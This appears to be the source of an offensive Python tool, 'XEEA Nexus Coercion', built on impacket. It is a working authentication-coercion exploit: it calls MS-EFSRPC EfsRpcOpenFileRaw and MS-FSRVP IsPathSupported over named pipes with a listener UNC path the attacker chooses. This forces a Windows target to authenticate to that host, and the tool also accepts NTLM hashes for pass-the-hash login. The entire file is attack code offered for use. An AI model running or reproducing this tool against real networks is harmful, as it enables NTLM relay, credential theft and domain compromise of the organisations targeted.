import sys
import argparse
import logging
from rich.console import Console
from rich.logging import RichHandler
from impacket import dcerpc
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR, ULONG, LPWSTR, BOOL, DWORD
from impacket.dcerpc.v5.rpcrt import DCERPC_v5, RPC_C_AUTHN_LEVEL_PKT_PRIVACY

# XEEA Nexus Branding
BANNER = r"""
  __  _______  _____   _   _ ________  ___   _ ____
  \ \/ /  ___||  ___| / \ | |  ____\ \/ / | | / ___|
   \  /| |__  | |__  / _ \| | |__   \  /| | | \___ \
   /  \|  __| |  __|/ ___ \ |  __|  /  \| |_| |___) |
  /_/\_\____|_|____/_/   \_\_|____/_/\_\\___/|____/
           XEEA NEXUS - COERCION TRIGGERS
"""

console = Console()
logging.basicConfig(
    level="INFO",
    format="%(message)s",
    datefmt="[%X]",
    handlers=[RichHandler(rich_tracebacks=True, console=console)]
)
log = logging.getLogger("rich")

class EfsRpcOpenFileRaw(NDRCALL):
    opnum = 0
    structure = (
        ('fileName', WSTR),
        ('Flag', ULONG),
    )

class IsPathSupported(NDRCALL):
    opnum = 8
    structure = (
        ('ShareName', WSTR),
    )

class NexusCoercion:
    """
    XEEA Nexus Coercion Engine
    Implements multi-protocol trigger logic for authenticated coercion.
    """
    def __init__(self, target, username, password, domain, hashes=None):
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain
        self.hashes = hashes
        self.lmhash = ''
        self.nthash = ''
        if hashes:
            if ':' in hashes:
                self.lmhash, self.nthash = hashes.split(':')
            else:
                self.nthash = hashes

    def _get_rpc_connection(self, named_pipe, uuid):
        string_binding = r'ncacn_np:%s[%s]' % (self.target, named_pipe)
        rpctransport = transport.DCETransportFactory(string_binding)
        
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(self.username, self.password, self.domain, self.lmhash, self.nthash)
        
        dce = rpctransport.get_dce_rpc()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.connect()
        dce.bind(uuid.decode() if isinstance(uuid, bytes) else uuid)
        return dce

    def trigger_efsrpc(self, listener_path):
        """XEEA EFSRPC Trigger"""
        log.info(f"Attempting MS-EFSRPC trigger on {self.target} via \\PIPE\\efsrpc")
        try:
            dce = self._get_rpc_connection(r'\PIPE\efsrpc', 'df1941c5-fe89-4e79-bf10-463657acf44d')
            request = EfsRpcOpenFileRaw()
            request['fileName'] = listener_path + '\x00'
            request['Flag'] = 0
            dce.request(request)
            log.info("[bold green][+][/bold green] MS-EFSRPC call sent successfully.")
        except Exception as e:
            if 'ERROR_BAD_NETPATH' in str(e) or 'rpc_s_access_denied' in str(e).lower():
                 log.info(f"[bold green][+][/bold green] MS-EFSRPC call sent (Exception as expected): {e}")
            else:
                 log.error(f"MS-EFSRPC Error: {e}")

    def trigger_fsrvp(self, listener_path):
        """XEEA FSRVP Trigger"""
        log.info(f"Attempting MS-FSRVP trigger on {self.target} via \\PIPE\\FssagentRpc")
        try:
            dce = self._get_rpc_connection(r'\PIPE\FssagentRpc', 'a8e0653c-2744-4389-a61d-7373df8b2292')
            request = IsPathSupported()
            request['ShareName'] = listener_path + '\x00'
            dce.request(request)
            log.info("[bold green][+][/bold green] MS-FSRVP call sent successfully.")
        except Exception as e:
             log.error(f"MS-FSRVP Error: {e}")

if __name__ == "__main__":
    console.print(BANNER, style="bold cyan")
    parser = argparse.ArgumentParser(add_help=True, description="XEEA Nexus Coercion Plugin")
    parser.add_argument('target', action='store', help='Target IP/Hostname')
    parser.add_argument('listener', action='store', help='Listener UNC path (e.g. \\\\10.10.10.1\\xeea)')
    parser.add_argument('-u', '--username', action='store', default='', help='Username')
    parser.add_argument('-p', '--password', action='store', default='', help='Password')
    parser.add_argument('-d', '--domain', action='store', default='', help='Domain')
    parser.add_argument('-hashes', action='store', help='LMHASH:NTHASH')
    parser.add_argument('-m', '--method', choices=['efsrpc', 'fsrvp', 'all'], default='all', help='Coercion method')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()
    coercer = NexusCoercion(args.target, args.username, args.password, args.domain, args.hashes)

    if args.method in ['efsrpc', 'all']:
        coercer.trigger_efsrpc(args.listener)
    if args.method in ['fsrvp', 'all']:
        coercer.trigger_fsrvp(args.listener)
